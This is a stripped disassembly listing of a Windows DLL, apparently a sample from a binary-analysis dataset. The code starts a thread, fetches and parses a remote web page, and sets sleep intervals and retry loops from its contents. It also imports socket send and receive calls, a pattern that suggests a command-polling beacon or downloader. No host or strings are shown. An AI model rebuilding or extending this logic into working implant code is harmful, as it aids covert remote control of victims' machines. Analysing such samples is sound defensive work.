mov [ esp + 0x14 ] 0x0
push ecx
push 0x104
call [ GetTempPathA@IAT ]
lea ebx [ ebp + 0x118 ]
push 0x2f
push ebx
call [ strrchr@IAT ]
mov edi eax
or ecx 0xffffffff
inc edi
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x20 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push 0x1
push eax
push ebx
[ edi ] [ esi ]
call sub_10001e50
add esp 0x14
test eax eax
jne r-xdata
push 0x1f018
call [ Sleep@IAT ]
jmp r-xdata
push 0x3709d8
call [ Sleep@IAT ]
jmp r-xdata
mov [ esp + 0x10 ] esi
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
cmp eax 0x3
mov eax [ ebp + 0x21c ]
jl r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x10 ] eax
cmp eax 0x3
mov eax [ ebp + 0x21c ]
jl r-xdata
cmp eax esi
je r-xdata
cmp eax esi
test eax eax
je r-xdata
test eax eax
jmp r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
sub_10002440
push ebp
mov ebp esp
push 0xffffffff
push sub_10002aa0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x5210
call sub_10002910
push ebx
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ ebp - 0x220 ]
xor esi esi
mov [ ebp - 0x10 ] esp
[ edi ]
push esi
push esi
mov ecx 0x41
lea edi [ ebp - 0x11c ]
push esi
push esi
[ edi ]
push rw-data
mov [ ebp - 0x4 ] esi
call [ InternetOpenA@IAT ]
push esi
mov edi eax
mov eax [ ebp + 0x8 ]
push 0x80000000
push esi
push esi
push eax
push edi
call [ InternetOpenUrlA@IAT ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x5220 ]
push ecx
mov ebx eax
push 0x5000
push edx
push ebx
mov [ ebp - 0x18 ] esi
call [ InternetReadFile@IAT ]
mov esi [ InternetCloseHandle@IAT ]
push ebx
call esi
push edi
call esi
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ebx + 0xa ]
mov esi ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ebp - 0x14 ] esi
mov edx ecx
mov [ ebp + 0xc ] 0xffffffff
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov ecx esi
mov edi ebx
lea esi [ ebp + eax - 0x5220 ]
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
or ecx 0xffffffff
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov esi [ ebp - 0x14 ]
inc eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
add eax ecx
mov [ ebp + 0xc ] eax
cmp ecx 0xffffffff
je r-xdata
lea esi [ ebp + eax - 0x5220 ]
mov ecx edx
lea edi [ ebx + 0xa ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov ecx [ ebp - 0x18 ]
sub ecx edx
sub ecx esi
cmp eax ecx
jg r-xdata
mov eax [ ebp + 0xc ]
sub ecx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
inc eax
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
mov edx ecx
lea esi [ ebp + eax - 0x5220 ]
lea edi [ ebp - 0x220 ]
lea eax [ ebp - 0x11c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x220 ]
push ecx
call sub_10002750
add esp 0x8
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
sub esi edx
cmp eax esi
jg r-xdata
mov esi [ strchr@IAT ]
lea edx [ ebp - 0x11c ]
push 0x3a
push edx
call esi
add esp 0x8
test eax eax
je r-xdata
lea eax [ ebp - 0x11c ]
push 0x3a
push eax
call esi
mov esi [ strstr@IAT ]
mov edi eax
lea ecx [ ebp - 0x11c ]
lea edx [ ebp - 0x11c ]
sub edi ecx
push rw-data
push edx
mov [ ebp + 0x8 ] edi
call esi
add esp 0x10
test eax eax
je r-xdata
lea edi [ ebp - 0x11c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
mov [ ebx + 0x21c ] eax
not ecx
dec ecx
mov esi ecx
inc esi
lea eax [ ebp - 0x11c ]
push rw-data
push eax
call esi
mov esi eax
lea ecx [ ebp - 0x11c ]
sub esi ecx
lea edx [ ebp + esi - 0x11a ]
push edx
call [ atoi@IAT ]
lea eax [ eax + eax * 2 ]
add esp 0xc
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
add eax 0x1b58
mov [ ebx + 0x21c ] eax
jmp r-xdata
mov [ eax + ebx + 0x14 ] 0x0
xor eax eax
mov cl [ ebp + eax - 0x11c ]
mov [ eax + ebx + 0x14 ] cl
inc eax
jmp r-xdata
xor eax eax
lea esi [ ebx + 0x14 ]
mov [ eax + ebx + 0x118 ] 0x0
movsx eax [ esi ]
push eax
call [ isdigit@IAT ]
add esp 0x4
test eax eax
je r-xdata
lea ecx [ edi + eax ]
inc eax
mov dl [ ebp + ecx - 0x11b ]
mov [ eax + ebx + 0x117 ] dl
jmp r-xdata
cmp eax edi
jge r-xdata
mov edi [ _stricmp@IAT ]
push rw-data
push esi
call edi
add esp 0x8
test eax eax
jne r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
sub edx edi
dec edx
cmp eax edx
jge r-xdata
push rw-data
push esi
call edi
add esp 0x8
neg eax
sbb eax eax
and al 0xfd
add eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10002750
sub esp 0x188
push ebx
push ebp
push esi
push edi
mov ecx 0x16
mov esi rw-data
lea edi [ esp + 0x3c ]
mov al [ rw-data ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x20 ]
mov [ esp + 0x98 ] al
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x99 ]
mov edx [ esp + 0x19c ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi edx
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x1a0 ]
[ edi ]
not ecx
sub edi ecx
xor ebx ebx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x3c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x1c ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
mov [ esp + 0x14 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x188
retn
mov esi ebp
mov ebp [ strchr@IAT ]
sub esi edx
mov edi edx
mov [ esp + 0x10 ] esi
movsx ecx al
lea edx [ esp + 0x3c ]
push ecx
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
mov [ esi + edi ] 0x20
jmp r-xdata
mov edx [ esp + 0x19c ]
lea ecx [ esp + 0x98 ]
movsx eax [ ebx + edx ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
mov edx [ esp + 0x1ac ]
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
pop ebx
add esp 0x188
retn
movsx eax [ edi ]
lea ecx [ esp + 0x3c ]
push eax
push ecx
call ebp
mov esi eax
lea edx [ esp + 0x44 ]
mov eax ebx
sub esi edx
cdq
idiv [ esp + 0x24 ]
lea ecx [ esp + 0x44 ]
movsx eax [ esp + edx + 0x28 ]
push eax
push ecx
call ebp
lea edx [ esp + 0x4c ]
add esp 0x10
sub edx eax
add esi edx
jns r-xdata
inc ebx
inc edi
cmp ebx ecx
jl r-xdata
mov ecx [ esp + 0x10 ]
mov al [ esp + esi + 0x3c ]
mov esi [ esp + 0x10 ]
mov [ ecx + edi ] al
mov ecx [ esp + 0x14 ]
add esi [ esp + 0x18 ]
mov al [ edi ]
cmp al 0x25
jne r-xdata
sub_10002910
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10002950
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10002950
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100021d0
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10002950
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10002950
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_100021d0
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
push 0x0
push 0x0
push 0x0
push sub_10002200
push 0x0
push 0x0
call [ CreateThread@IAT ]
sub_10002434
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
sub_1000272c
call [ GetLastError@IAT ]
mov eax r-xdata
retn
WSACleanup
jmp [ WSACleanup@IAT ]
closesocket
jmp [ closesocket@IAT ]
recv
jmp [ recv@IAT ]
connect
jmp [ connect@IAT ]
setsockopt
jmp [ setsockopt@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
htons
jmp [ htons@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
send
jmp [ send@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_10002aa0
mov eax r--data
jmp __CxxFrameHandler
